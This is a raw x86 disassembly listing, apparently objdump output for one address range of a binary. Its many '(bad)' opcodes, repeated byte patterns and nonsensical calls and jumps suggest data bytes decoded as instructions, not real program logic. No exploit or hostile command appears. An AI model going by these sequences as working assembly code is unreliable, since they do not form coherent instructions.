  415030:	mov    esi,0xc6ffbebe
  415035:	mov    dh,0xff
  415038:	iret   
  415039:	iret   
  41503a:	iret   
  41503b:	(bad)  
  41503c:	fcmovu st,st(2)
  41503e:	(bad)  
  415040:	fcmovnu st,st(3)
  415042:	(bad)  
  415044:	iret   
  415045:	iret   
  415046:	iret   
  415047:	inc    edi
  415049:	mov    edi,0xcacacaff
  41504f:	inc    esi
  415051:	mov    dh,0xff
  415054:	mov    ecx,0x9effb9b9
  415059:	sahf   
  41505a:	sahf   
  41505b:	dec    DWORD PTR [esi-0x36007172]
  415061:	leave  
  415062:	leave  
  415063:	jmp    DWORD PTR [ecx]
  415065:	and    DWORD PTR [ecx],esp
  415067:	jno    0x415069
  415069:	add    BYTE PTR [eax],al
  41506b:	and    DWORD PTR [eax],eax
  41506d:	add    BYTE PTR [eax],al
  41506f:	xor    al,BYTE PTR [eax]
  415071:	add    BYTE PTR [eax],al
  415073:	pop    ds
  415074:	add    BYTE PTR [eax],al
  415076:	add    BYTE PTR [edx],dl
	...
  4150a8:	(bad)
  4150ab:	loope  0x41507b
  4150ad:	into   
  4150ae:	into   
  4150af:	(bad)  
  4150b0:	mov    edi,0xbfffbfbf
  4150b5:	mov    edi,0xc9c9ffbf
  4150ba:	leave  
  4150bb:	call   eax
  4150bd:	rcl    al,1
  4150bf:	call   edx
  4150c1:	rcl    ah,cl
  4150c3:	dec    edi
  4150c5:	iret   
  4150c6:	iret   
  4150c7:	inc    esi
  4150c9:	mov    dh,0xff
  4150cc:	mov    esi,0xa2ffbebe
  4150d1:	mov    ds:0x8585ffa2,al
  4150d6:	test   edi,edi
  4150d8:	test   BYTE PTR [esp+eax*4-0x64646401],al
  4150df:	call   DWORD PTR [ebp+0xef9595]
  4150e5:	add    BYTE PTR [eax],al
  4150e7:	pop    ss
  4150e8:	or     al,0xc
  4150ea:	or     al,0x18
  4150ec:	or     BYTE PTR [eax],cl
  4150ee:	or     DWORD PTR ds:0x13000000,edx
  4150f4:	add    BYTE PTR [eax],al
  4150f6:	add    BYTE PTR [eax+eax*1],cl
  4150f9:	add    BYTE PTR [eax],al
  4150fb:	add    BYTE PTR [ecx],bh
  4150fd:	cmp    edi,DWORD PTR [edx+ebx*1]
  415100:	push   ebp
  415101:	push   ebp
  415102:	push   edi
  415103:	enter  0x8789,0x87
  415107:	call   DWORD PTR [ecx+0x50]
  41510a:	push   eax
  41510b:	sahf   
  41510c:	add    DWORD PTR [ecx],eax
  41510e:	add    DWORD PTR [edx],edi
  415110:	add    BYTE PTR [eax],al
  415112:	add    BYTE PTR [esi],dh
  415114:	adc    edx,DWORD PTR [ebx]
  415116:	adc    esi,DWORD PTR [ecx+0x14]
  415119:	adc    al,0x14
  41511b:	fs inc ebx
  41511d:	inc    ebx
  41511e:	inc    ecx
  41511f:	or     eax,0x0
	...
  41512c:	mov    DWORD PTR [ecx-0x2c2c5c77],ecx
  415132:	aam    0xff
  415134:	retf   
  415135:	retf   
  415136:	retf   
  415137:	push   DWORD PTR [esi-0x4f004a4a]
  41513d:	mov    al,0xb0
  41513f:	jmp    FWORD PTR [edi-0x65005251]
  415145:	cdq    
  415146:	cdq    
  415147:	inc    DWORD PTR [ebx+0x6aff8384]
  41514d:	push   0x6a
  41514f:	call   DWORD PTR [ebx+0x52]
  415152:	push   edx
  415153:	jmp    DWORD PTR [edi+0x67]
  415156:	call   DWORD PTR [di-0x6c6d]
  41515b:	push   DWORD PTR [esp+esi*4-0x5e5b004b]
  415162:	mov    eax,ds:0xa4a2a5de
  415167:	fcmovnb st,st(3)
  415169:	ret    
  41516a:	(bad)  
  41516b:	call   FWORD PTR [edi+0x5f]
  41516e:	pop    ebp
  41516f:	pop    edx
  415170:	add    BYTE PTR [eax],al
  415172:	add    BYTE PTR [eax],al
  415174:	add    BYTE PTR [eax],al
  415176:	add    BYTE PTR ds:0x0,al
  41517c:	jge    0x4151fa
  41517e:	jge    0x415148
  415180:	sahf   
  415181:	fwait
  415182:	cdq    
  415183:	push   DWORD PTR [edi-0x1f004e4e]
  415189:	loopne 0x41516c
  41518b:	call   FWORD PTR [ebx+0x47ff9b9b]
  415191:	inc    edi
  415192:	inc    edi
  415193:	sti    
  415194:	push   0xa5ff6868
  415199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41519b:	clc    
  41519c:	lea    ecx,[ebp+0x1e1eda8b]
  4151a2:	sbb    eax,0x4d4c4c73
  4151a7:	push   cs
	...
  4151b0:	and    DWORD PTR [eax],esp
  4151b2:	push   ds
  4151b3:	dec    ecx
  4151b4:	jb     0x415228
  4151b6:	jo     0x415176
  4151b8:	fwait
  4151b9:	fwait
  4151ba:	fwait
  4151bb:	out    dx,al
  4151bc:	pushf  
  4151bd:	call   0xff75:0x7777ff99
  4151c4:	jae    0x415236
  4151c6:	jae    0x4151c7
  4151c8:	je     0x41523b
  4151ca:	je     0x4151cb
  4151cc:	add    BYTE PTR [ecx-0x6061007d],0xa1
  4151d3:	jmp    FWORD PTR [ebx-0x4800494e]
  4151d9:	(bad)  
  4151da:	retf   
  4151db:	inc    eax
  4151dd:	(bad)  
  4151df:	dec    edi
  4151e1:	jmp    0xe51e51d2
  4151e6:	out    0xff,al
  4151e8:	rcl    ebx,cl
  4151ea:	aam    0xff
  4151ec:	pop    esi
  4151ed:	pop    esi
  4151ee:	pop    esi
  4151ef:	add    BYTE PTR [eax],0x0
	...
  4151fa:	add    BYTE PTR [eax],al
  4151fc:	lea    ecx,[ebp+ecx*4-0x4b484417]
  415203:	dec    DWORD PTR [esi-0x52007173]
  415209:	lods   eax,DWORD PTR ds:[esi]
  41520a:	scas   al,BYTE PTR es:[edi]
  41520b:	call   edx
  41520d:	aam    0xd2
  41520f:	inc    esp
  415211:	(bad)  
  415212:	(bad)  
  415213:	call   DWORD PTR [eax+0x52ec9190]
  415219:	push   edx
  41521a:	push   edx
  41521b:	mov    edx,0xc87a7979
  415220:	lods   al,BYTE PTR ds:[esi]
  415221:	lods   al,BYTE PTR ds:[esi]
  415222:	lods   eax,DWORD PTR ds:[esi]
  415223:	stc    
  415224:	mov    BYTE PTR [eax+0x2b2be68a],cl
  41522a:	sub    edi,DWORD PTR [ecx+0x0]
  41522d:	add    BYTE PTR [eax],al
  41522f:	or     al,BYTE PTR [eax]
  415231:	add    BYTE PTR [eax],al
  415233:	add    BYTE PTR [ebx],dh
  415235:	xor    DWORD PTR ds:0x6663631f,esi
  41523b:	test   BYTE PTR [edx-0x77026b71],cl
  415241:	xchg   ecx,eax
  415242:	cwde   
  415243:	dec    DWORD PTR [esp+ebx*4-0x5068005d]
  41524a:	mov    bh,0xff
  41524c:	mov    ecx,0xcbffd9d3
  415251:	in     al,0xe5
  415253:	call   eax
  415255:	fsubrp st(0),st
  415257:	call   ebp
  415259:	rcl    al,cl
  41525b:	call   esp
  41525d:	mov    cl,0xa7
  41525f:	call   ecx
  415261:	jl     0x4152dd
  415263:	dec    ebx
  415265:	mov    esp,0xc8bbffb6
  41526a:	enter  0x93ff,0x93
  41526e:	xchg   ecx,eax
  41526f:	cwde   
	...
  41527c:	xchg   DWORD PTR [ebp-0x453f267b],eax
  415282:	mov    ebx,0xa4a1a4ff
  415287:	jmp    FWORD PTR [ebp-0x51005354]
  41528d:	scas   al,BYTE PTR es:[edi]
  41528e:	lods   eax,DWORD PTR ds:[esi]
  41528f:	jmp    FWORD PTR [edx-0x30005657]
  415295:	iret   
  415296:	iret   
  415297:	call   edi
  415299:	xlat   BYTE PTR ds:[ebx]
  41529a:	xlat   BYTE PTR ds:[ebx]
  41529b:	dec    DWORD PTR [ebx+ecx*4+0x5153dd8c]
  4152a2:	push   edx
  4152a3:	loope  0x415229
  4152a5:	add    DWORD PTR [edi+edi*8-0xe919396],0xffffff8d
  4152ad:	xchg   esi,eax
  4152ae:	call   0xb5ff:0xc7c2b1ed
  4152b5:	int    0xd4
  4152b7:	jmp    FWORD PTR [eax+ecx*8-0x34510032]
  4152be:	int3   
  4152bf:	(bad)  
  4152c0:	mov    ebp,0xc5ffc8c6
  4152c5:	mov    bh,0xb5
  4152c7:	inc    edi
  4152c9:	lods   al,BYTE PTR ds:[esi]
  4152ca:	stos   BYTE PTR es:[edi],al
  4152cb:	dec    eax
  4152cd:	xchg   esi,eax
  4152ce:	mov    ?,edi
  4152d0:	lds    ebp,FWORD PTR [ecx+0x59]
  4152d3:	(bad)  
  4152d4:	mov    ebx,0xafff1e2d
  4152d9:	add    eax,0xa3ff00
  4152de:	add    bh,bh
  4152e0:	cdq    
  4152e1:	add    BYTE PTR [eax],al
  4152e3:	(bad)  
  4152e4:	mov    esp,0xc3ff848a
  4152e9:	loopne 0x4152cf
  4152eb:	call   FWORD PTR [eax+0xb59494]
	...
  4152f9:	add    BYTE PTR [eax],al
  4152fb:	add    BYTE PTR [edx+ecx*4-0x3b352375],cl
  415302:	(bad)  
  415305:	mov    ds:0xadacffa5,eax
  41530a:	scas   al,BYTE PTR es:[edi]
  41530b:	jmp    DWORD PTR [edx-0x6d005b5c]
  415311:	xchg   ecx,eax
  415312:	xchg   ecx,eax
  415313:	call   DWORD PTR [ecx+0x7fff928e]
  415319:	mov    WORD PTR [esi-0x514b6901],cs
  41531f:	(bad)  
  415320:	mov    ecx,0xd4ffd3ce
  415325:	out    dx,al
  415326:	hlt    
  415327:	(bad)  
  415328:	fdiv   st(3),st
  41532a:	std    
  41532b:	call   eax
  41532d:	loope  0x415312
  41532f:	inc    esi
  415331:	rol    al,0xff
  415334:	mov    esp,0xbbff9e9f
  415339:	jge    0x4153b0
  41533b:	push   DWORD PTR [ebp+ebx*2+0x35abff5d]
  415342:	xor    edi,edi
  415344:	mov    al,ds:0xa0ff000c
  415349:	add    BYTE PTR [eax],al
  41534b:	jmp    DWORD PTR [ecx-0x5d010000]
  415351:	add    BYTE PTR [eax],al
  415353:	jmp    DWORD PTR [ebx+ecx*1+0x1dabff00]
  41535a:	or     bh,bh
  41535c:	mov    dl,0x2c
  41535e:	sbb    bh,bh
  415360:	mov    bh,0x16
  415362:	add    bh,bh
  415364:	(bad)  
  415365:	mov    DWORD PTR [eax-0x15193901],eax
  41536b:	call   DWORD PTR [edx+0xcc8e8f]
	...
  415379:	add    BYTE PTR [eax],al
  41537b:	add    BYTE PTR [ecx-0x2d1f7173],dl
  415381:	int    0xcc
  415383:	jmp    DWORD PTR [esi-0x51005e5e]
  415389:	lods   al,BYTE PTR ds:[esi]
  41538a:	scas   eax,DWORD PTR es:[edi]
  41538b:	jmp    FWORD PTR [ecx-0x68005657]
  415391:	xchg   edi,eax
  415392:	xchg   edi,eax
  415393:	jmp    FWORD PTR [eax-0x58005359]
  415399:	mov    ch,0xb6
  41539b:	inc    eax
  41539d:	iret   
  41539e:	retf   0xbaff
  4153a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153a3:	push   DWORD PTR [eax-0x5d008d8c]
  4153a9:	push   eax
  4153aa:	push   edx
  4153ab:	call   FWORD PTR [eax-0x7100cccb]
  4153b1:	adc    DWORD PTR [eax],edx
  4153b3:	inc    DWORD PTR [ebp-0x7e010000]
  4153b9:	add    BYTE PTR [eax],al
  4153bb:	inc    DWORD PTR [ebx-0x7200feff]
  4153c1:	add    BYTE PTR [eax],al
  4153c3:	call   FWORD PTR [edx-0x5000fffe]
  4153c9:	xor    DWORD PTR ds:0x2b3db7ff,ebx
  4153cf:	(bad)  
  4153d0:	mov    ebx,0xbfff293c
  4153d5:	aas    
  4153d6:	sub    eax,0x2d41c2ff
  4153db:	inc    esi
  4153dd:	inc    ebx
  4153de:	sub    al,0xff
  4153e0:	enter  0x1029,0xff
  4153e4:	int3   
  4153e5:	je     0x41544e
  4153e7:	inc    esi
  4153e9:	jmp    0x93d953db
  4153ee:	xchg   edx,eax
  4153ef:	(bad)  
	...
  4153fc:	xchg   ebx,eax
  4153fd:	(bad)  
  4153fe:	xchg   edx,eax
  4153ff:	loope  0x4153db
  415401:	rcl    dl,cl
  415403:	jmp    DWORD PTR [esi-0x53005a5c]
  415409:	scas   al,BYTE PTR es:[edi]
  41540a:	scas   eax,DWORD PTR es:[edi]
  41540b:	jmp    FWORD PTR [edx+ebp*4-0x63630054]
  415412:	pushf  
  415413:	inc    edx
  415415:	rcl    edi,cl
  415417:	call   DWORD PTR [eax-0x7100bbbd]
  41541d:	adc    al,0x17
  41541f:	dec    DWORD PTR [esp+ecx*1+0x7cff05]
  415426:	add    bh,bh
  415428:	je     0x41542a
  41542a:	add    bh,bh
  41542c:	jne    0x41542e
  41542e:	add    bh,bh
  415430:	jnp    0x415432
  415432:	add    bh,bh
  415434:	mov    DWORD PTR [ebx],eax
  415436:	add    bh,bh
  415438:	ja     0x41545c
  41543a:	sbb    edi,edi
  41543c:	outs   dx,DWORD PTR ds:[esi]
  41543d:	sub    esp,DWORD PTR [edx]
  41543f:	call   FWORD PTR [ecx-0x5200fff0]
  415445:	sbb    BYTE PTR [ecx],al
  415447:	inc    eax
  415449:	dec    eax
  41544a:	cmp    edi,edi
  41544c:	lds    ecx,FWORD PTR [ebp+edi*1-0x1]
  415450:	retf   0x3a4b
  415453:	dec    esi
  415455:	dec    edi
  415456:	cmp    al,0xff
  415458:	rcl    DWORD PTR [edx+0x3e],1
  41545b:	call   esp
  41545d:	push   esi
  41545e:	inc    ecx
  41545f:	call   esi
  415461:	inc    esp
  415462:	sub    eax,0x5367d2ff
  415467:	dec    edx
  415469:	out    0xeb,al
  41546b:	call   FWORD PTR [ebp-0x6c196162]
  415471:	xchg   ebx,eax
  415472:	xchg   ebx,eax
  415473:	adc    al,BYTE PTR [eax]
  415475:	add    BYTE PTR [eax],al
  415477:	add    BYTE PTR [eax],al
  415479:	add    BYTE PTR [eax],al
  41547b:	add    BYTE PTR [ecx-0x211e6d6f],dl
  415481:	(bad)  
  415482:	fdivr  st,st(7)
  415484:	test   al,0xa6
  415486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415487:	jmp    FWORD PTR [esi-0x4e005150]
  41548d:	mov    al,0xb1
  41548f:	jmp    DWORD PTR [eax-0x38005f60]
  415495:	fcmovu st,st(7)
  415497:	inc    DWORD PTR [ecx+0x7fff272b]
  41549d:	add    BYTE PTR [eax],al
  41549f:	dec    DWORD PTR [ebp-0x7400f6eb]
  4154a5:	sbb    BYTE PTR [edi],cl
  4154a7:	dec    DWORD PTR [ebx-0x7600f3e9]
  4154ad:	adc    BYTE PTR ds:0x1090ff,al
  4154b3:	(bad)  
  4154b4:	jns    0x4154da
  4154b6:	sbb    bh,bh
  4154b8:	mov    cl,0xa7
  4154ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154bb:	push   DWORD PTR [esp+esi*4+0x1e76ffb4]
  4154c2:	push   ss
  4154c3:	push   DWORD PTR [ebp-0x2e00f4e2]
  4154c9:	gs push edx
  4154cb:	call   ebx
  4154cd:	fs push edx
  4154cf:	call   edi
  4154d1:	bound  ecx,QWORD PTR [esi-0x1]
  4154d4:	fisub  DWORD PTR [eax+edx*2-0x1]
  4154d8:	frstor [edi+0x52]
  4154db:	jmp    eax
  4154dd:	imul   edx,DWORD PTR [ebp-0x1],0xff475fe6
  4154e4:	in     al,0x68
  4154e6:	push   edx
  4154e7:	call   eax
  4154e9:	in     eax,0xe6
  4154eb:	jmp    DWORD PTR [edx-0x6b005658]
  4154f1:	nop
  4154f2:	nop
  4154f3:	add    BYTE PTR cs:[eax],al
  4154f6:	add    BYTE PTR [eax],al
  4154f8:	add    BYTE PTR [eax],al
  4154fa:	add    BYTE PTR [eax],al
  4154fc:	xchg   ebx,eax
  4154fd:	nop
  4154fe:	xchg   edx,eax
  4154ff:	loope  0x4154df
  415501:	aam    0xd5
  415503:	jmp    DWORD PTR [ebp-0x4f005b5d]
  415509:	scas   eax,DWORD PTR es:[edi]
  41550a:	scas   eax,DWORD PTR es:[edi]
  41550b:	push   DWORD PTR [esp+esi*4-0x5959004b]
  415512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415513:	inc    ebx
  415515:	rcl    dl,1
  415517:	dec    DWORD PTR [edi-0x7100a7a3]
  41551d:	adc    ecx,DWORD PTR [eax]
  41551f:	call   FWORD PTR [eax-0x6c00d6d1]
  415525:	daa    
  415526:	and    bh,bh
  415528:	xchg   edx,eax
  415529:	sub    BYTE PTR ds:0x71391ff,bl
  41552f:	(bad)  
  415530:	js     0x41554f
  415532:	pop    ss
  415533:	inc    ebp
  415535:	mov    bh,0xb5
  415537:	(bad)  
  415538:	(bad)  
  41553a:	(bad)  
  41553c:	(bad)
  41553f:	call   FWORD PTR [ebp-0x5c007878]
  415545:	sub    edx,DWORD PTR [esi]
  415547:	(bad)  
  415548:	fnstsw WORD PTR [edx+0x6b]
  41554b:	(bad)  
  41554c:	fnsave [edx+eiz*2-0x1]
  415550:	loopne 0x4155c6
  415552:	(bad)  
  415553:	jmp    ebx
  415555:	ja     0x4155ba
  415557:	jmp    esi
  415559:	js     0x4155bf
  41555b:	(bad)  
  41555c:	jmp    0xec40bddc
  415561:	ja     0x4155c1
  415563:	(bad)  
  415564:	in     al,dx
  415565:	jo     0x4155c1
  415567:	call   ebx
  415569:	fsubrp st(1),st
  41556b:	jmp    FWORD PTR [ecx-0x6d004d4f]
  415571:	xchg   ecx,eax
  415572:	xchg   ecx,eax
  415573:	dec    ecx
	...
  41557c:	xchg   edx,eax
  41557d:	mov    ss,WORD PTR [eax-0x32322e1f]
  415583:	call   FWORD PTR [ebp-0x4d006465]
  415589:	mov    cl,0xb1
  41558b:	(bad)  
  41558c:	mov    edi,0xb3ffc0c0
  415591:	mov    bl,0xb3
  415593:	dec    eax
  415595:	rcl    ebx,1
  415597:	call   FWORD PTR [edx-0x7100868a]
  41559d:	sbb    dl,BYTE PTR [ecx]
  41559f:	call   FWORD PTR [esi-0x6400cdc6]
  4155a5:	cmp    dh,BYTE PTR [esi]
  4155a7:	call   DWORD PTR [edi+0x7cff2731]
  4155ad:	das    
  4155ae:	sub    bh,bh
  4155b0:	xlat   BYTE PTR ds:[ebx]
  4155b1:	int3   
  4155b2:	retf   
  4155b3:	push   esi
  4155b5:	div    dh
  4155b7:	call   FWORD PTR [ebx-0x4a00a49d]
  4155bd:	xchg   ecx,eax
  4155be:	mov    edi,edi
  4155c0:	(bad)  
  4155c2:	(bad)  
  4155c4:	nop
  4155c5:	pusha  
  4155c6:	pop    eax
  4155c7:	jmp    edx
  4155c9:	pop    DWORD PTR [edx+0x7485e6ff]
  4155cf:	(bad)  
  4155d0:	jmp    0xec40cb5c
  4155d5:	mov    DWORD PTR [edi-0x1],esi
  4155d8:	out    dx,al
  4155d9:	mov    bh,BYTE PTR [ecx-0x1]
  4155dc:	lock lea edi,[edx-0x1]
  4155e0:	repz (bad) 
  4155e2:	jns    0x4155e3
  4155e4:	hlt    
  4155e5:	js     0x41564a
  4155e7:	call   ebp
  4155e9:	rcl    cl,cl
  4155eb:	jmp    FWORD PTR [ebp-0x6e004143]
  4155f1:	mov    cs,WORD PTR [ebp+0x5d]
  4155f7:	add    BYTE PTR [eax],al
  4155f9:	add    BYTE PTR [eax],al
  4155fb:	add    BYTE PTR [ecx-0x331e6d72],dl
  415601:	mov    ah,0xbe
  415603:	call   DWORD PTR [ebp-0x4900757d]
  415609:	mov    edx,0xcbcbffb7
  41560e:	retf   
  41560f:	(bad)  
  415610:	mov    ebx,0xc6ffbbba
  415615:	retf   
  415616:	int    0xff
  415618:	lahf   
  415619:	xchg   edx,eax
  41561a:	xchg   esp,eax
  41561b:	dec    DWORD PTR [edi-0x5900e5df]
  415621:	dec    ecx
  415622:	inc    ebx
  415623:	jmp    FWORD PTR [ebx-0x5b00b3ab]
  415629:	dec    ecx
  41562a:	inc    ecx
  41562b:	call   esp
  41562d:	int3   
  41562e:	int3   
  41562f:	(bad)  
  415630:	out    dx,al
  415631:	in     al,dx
  415632:	jmp    0x415633
  415634:	xchg   ebx,eax
  415635:	dec    esi
  415636:	inc    ebp
  415637:	jmp    FWORD PTR [ebp-0x5200fce8]
  41563d:	ss and edi,edi
  415640:	out    0xdf,eax
  415642:	(bad)  
  415644:	fcom   st(6)
  415646:	(bad)  
  415647:	jmp    DWORD PTR [edi-0x11008a83]
  41564d:	cwde   
  41564e:	xchg   edi,edi
  415650:	lock cdq 
  415652:	mov    edi,edi
  415654:	repz fwait
  415656:	mov    bh,bh
  415658:	neg    BYTE PTR [ebp-0x61080074]
  41565e:	(bad)  
  41565f:	(bad)  
  415660:	cli    
  415661:	mov    ds:0x89fcff91,al
  415666:	jb     0x415667
  415668:	loope  0x41562e
  41566a:	mov    edi,0xd0ccb7ff
  41566f:	call   DWORD PTR [ecx+0x678d8d]
  415675:	add    BYTE PTR [eax],al
  415677:	add    BYTE PTR [eax],al
  415679:	add    BYTE PTR [eax],al
  41567b:	add    BYTE PTR [edi-0x501e757f],cl
  415681:	stos   BYTE PTR es:[edi],al
  415682:	test   al,0xff
  415684:	xchg   ecx,eax
  415685:	fwait
  415686:	xchg   ebp,eax
  415687:	(bad)  
  415688:	mov    ebp,0xcdffbbb4
  41568d:	ror    dh,1
  41568f:	(bad)  
  415690:	mov    edi,0xc1ffbfbd
  415695:	(bad)
  415698:	mov    al,0xb6
  41569a:	mov    edx,0x212a8eff
  41569f:	jmp    FWORD PTR [esi-0x4c00b0aa]
  4156a5:	pusha  
  4156a6:	push   edi
  4156a7:	call   DWORD PTR [ebp-0x5b00ede7]
  4156ad:	push   eax
  4156ae:	dec    edx
  4156af:	call   DWORD PTR [esi+esi*1+0x16aaff28]
  4156b6:	add    edi,edi
  4156b8:	mov    bh,0x17
  4156ba:	add    bh,bh
  4156bc:	rcr    BYTE PTR [ecx],0x1
  4156bf:	push   DWORD PTR [ebx-0x9a98]
  4156c5:	(bad)  
  4156c6:	(bad)  
  4156c7:	(bad)  
  4156c8:	mov    ecx,0xcbffaeb0
  4156cd:	mov    edi,DWORD PTR [edi-0x1]
  4156d0:	cmc    
  4156d1:	test   al,0x99
  4156d3:	(bad)  
  4156d4:	clc    
  4156d5:	stos   BYTE PTR es:[edi],al
  4156d6:	fwait
  4156d7:	(bad)  
  4156d8:	cli    
  4156d9:	lods   eax,DWORD PTR ds:[esi]
  4156da:	pushf  
  4156db:	(bad)  
  4156dc:	std    
  4156dd:	scas   al,BYTE PTR es:[edi]
  4156de:	popf   
  4156df:	(bad)  
  4156e0:	push   DWORD PTR [ecx-0x6600005b]
  4156e6:	cmp    edi,0xffffffed
  4156e9:	mov    edi,0xd0bcffb7
  4156ee:	fdivr  st,st(7)
  4156f0:	xchg   ecx,eax
  4156f1:	mov    cs,WORD PTR [ebp+0x81]
  4156f7:	add    BYTE PTR [eax],al
  4156f9:	add    BYTE PTR [eax],al
  4156fb:	add    BYTE PTR [esi-0x72],dh
  4156fe:	sbb    ebp,0x15
  415701:	repnz test edi,edi
  415704:	dec    ebx
  415705:	(bad)  
  415706:	mov    ?,edi
  415708:	fild   QWORD PTR [eax-0x282e003c]
  41570e:	aam    0xff
  415710:	(bad)
  415713:	inc    edi
  415715:	enter  0xffc9,0xba
  415719:	retf   0xffce
  41571c:	xchg   ecx,eax
  41571d:	xor    DWORD PTR ds:0x6067b8ff,ebp
  415723:	push   DWORD PTR [eax-0x6f00b6ae]
  415729:	add    BYTE PTR [eax],al
  41572b:	jmp    DWORD PTR [ebx+edx*1+0x15aaff00]
  415732:	add    bh,bh
  415734:	mov    ah,0x18
  415736:	add    bh,bh
  415738:	ret    0x1c
  41573b:	dec    ecx
  41573d:	sbb    al,BYTE PTR [eax]
  41573f:	inc    ebp
  415741:	pop    ds
  415742:	push   cs
  415743:	call   ebp
  415745:	mov    bl,0xff
  415748:	std    
  415749:	std    
  41574a:	std    
  41574b:	jmp    FWORD PTR [eax-0xd007471]
  415751:	mov    cl,0xa3
  415753:	(bad)  
  415754:	std    
  415755:	mov    ebx,0xbdfeffac
  41575a:	lods   eax,DWORD PTR ds:[esi]
  41575b:	(bad)  
  41575c:	(bad)  
  41575d:	mov    edi,0xc3ffffae
  415762:	mov    dh,0xff
  415764:	push   DWORD PTR [edx-0x3d0f0066]
  41576a:	mov    ch,0xff
  41576c:	rcl    ah,0xda
  41576f:	call   DWORD PTR [eax+0xb98b8d]
  415775:	add    BYTE PTR [eax],al
  415777:	add    BYTE PTR [eax],al
  415779:	add    BYTE PTR [eax],al
  41577b:	add    BYTE PTR [eax-0x7f],ch
  41577e:	jbe    0x415758
  415780:	add    BYTE PTR [ebx+0x39],bh
  415783:	jmp    DWORD PTR [edx+0x78]
  415786:	imul   edi,edi,0xffd0c4d8
  41578c:	xlat   BYTE PTR ds:[ebx]
  41578d:	(bad)  
  41578f:	dec    edx
  415791:	retf   0xffca
  415794:	int    0xcd
  415796:	into   
  415797:	(bad)  
  415798:	mov    esp,0x93ffd1ce
  41579d:	xor    al,0x31
  41579f:	(bad)  
  4157a0:	mov    esi,0xa2ff6870
  4157a5:	sub    esp,DWORD PTR [eax]
  4157a7:	call   FWORD PTR [ebx-0x5100ffff]
  4157ad:	sbb    BYTE PTR [eax],al
  4157af:	(bad)  
  4157b0:	mov    esi,0xcaff0019
  4157b5:	sbb    eax,0x24d6ff00
  4157ba:	add    bh,bh
  4157bc:	loopne 0x4157d4
  4157be:	add    bh,bh
  4157c0:	lock sub al,0x4
  4157c3:	call   ebp
  4157c5:	lods   eax,DWORD PTR ds:[esi]
  4157c6:	mov    ds:0xdcdde0ff,eax
  4157cb:	jmp    eax
  4157cd:	loopne 0x4157af
  4157cf:	jmp    DWORD PTR [edi-0x7d76]
  4157d5:	into   
  4157d6:	mov    ebx,0xbcccffff
  4157db:	(bad)  
  4157dc:	dec    edi
  4157de:	mov    ebp,0xc5d5ffff
  4157e3:	(bad)  
  4157e4:	dec    ecx
  4157e6:	mov    cl,0xff
  4157e8:	hlt    
  4157e9:	ret    
  4157ea:	lods   eax,DWORD PTR ds:[esi]
  4157eb:	inc    ebp
  4157ed:	aam    0xdc
  4157ef:	call   DWORD PTR [ecx-0x681f7071]
  4157f5:	xchg   edi,eax
  4157f6:	xchg   edi,eax
  4157f7:	or     eax,DWORD PTR [eax]
  4157f9:	add    BYTE PTR [eax],al
  4157fb:	add    BYTE PTR [edx+ebp*2+0x71],dh
  4157ff:	in     al,0x47
  415801:	es sub eax,0x675f7aff
  415807:	inc    eax
  415809:	mov    bh,0xff
  41580c:	xlat   BYTE PTR ds:[ebx]
  41580d:	fcomp  st(0)
  41580f:	inc    ebx
  415811:	ret    
  415812:	ret    
  415813:	call   eax
  415815:	rcl    cl,1
  415817:	(bad)  
  415818:	mov    esi,0x95ffd3d0
  41581d:	inc    edx
  41581e:	cmp    eax,0x5461b7ff
  415823:	call   FWORD PTR [ecx+ecx*1+0xfaaff00]
  41582a:	add    bh,bh
  41582c:	mov    bh,0x19
  41582e:	add    bh,bh
  415830:	les    ebx,FWORD PTR [eax+eax*1]
  415833:	call   eax
  415835:	and    BYTE PTR [eax],al
  415837:	(bad)  
  415838:	(bad)  [esi]
  41583a:	add    bh,bh
  41583c:	out    0xe,eax
  41583e:	add    bh,bh
  415840:	hlt    
  415841:	dec    edx
  415842:	sub    bh,bh
  415844:	(bad)  
  415845:	loopne 0x41581f
  415847:	inc    esp
  415849:	scas   al,BYTE PTR es:[edi]
  41584a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584b:	(bad)  
  41584c:	(bad)  
  41584e:	fdivp  st(7),st
  415850:	mov    esi,0xbdffbabb
  415855:	mov    eax,ds:0xd8ffff96
  41585a:	enter  0xffff,0xd9
  41585e:	leave  
  41585f:	(bad)  
  415860:	(bad)  
  415861:	fcmovne st,st(6)
  415863:	(bad)  
  415864:	(bad)  
  415865:	fadd   st,st(3)
  415867:	(bad)  
  415868:	stc    
  415869:	ret    0xffa9
  41586c:	retf   
  41586d:	xlat   BYTE PTR ds:[ebx]
  41586e:	(bad)  
  415870:	xchg   ebx,eax
  415871:	xchg   esi,eax
  415872:	xchg   edi,eax
  415873:	not    BYTE PTR [esi+0x189596]
  415879:	add    BYTE PTR [eax],al
  41587b:	add    BYTE PTR [esi+0x7a9e8d8b],cl
  415881:	je     0x4158fa
  415883:	jmp    FWORD PTR [ebp-0xa005354]
  415889:	idiv   cl
  41588b:	(bad)  
  41588c:	(bad)  
  41588d:	(bad)  
  41588e:	(bad)  
  41588f:	jmp    ecx
  415891:	loope  0x415874
  415893:	call   edi
  415895:	xlat   BYTE PTR ds:[ebx]
  415896:	xlat   BYTE PTR ds:[ebx]
  415897:	inc    ecx
  415899:	rcl    bh,cl
  41589b:	call   FWORD PTR [ebx-0x5e00aca8]
  4158a1:	sub    BYTE PTR [ecx],bl
  4158a3:	call   FWORD PTR [edi-0x5000fffc]
  4158a9:	pop    ss
  4158aa:	add    bh,bh
  4158ac:	mov    ebx,0xc7ff001a
  4158b1:	sbb    eax,0x20d3ff00
  4158b6:	add    bh,bh
  4158b8:	fbld   TBYTE PTR [esi]
  4158ba:	add    bh,bh
  4158bc:	jmp    0x4158c7
  4158be:	add    bh,bh
  4158c0:	sti    
  4158c1:	ja     0x415920
  4158c3:	(bad)  
  4158c4:	push   ecx
  4158c6:	out    dx,eax
  4158c7:	(bad)  
  4158c8:	clc    
  4158c9:	aad    0xc8
  4158cb:	inc    eax
  4158cd:	mov    bl,0xaf
  4158cf:	call   esp
  4158d1:	aam    0xd4
  4158d3:	jmp    DWORD PTR [edi-0x36005e5d]
  4158d9:	mov    bl,0xa8
  4158db:	(bad)  
  4158dc:	cld    
  4158dd:	(bad)  
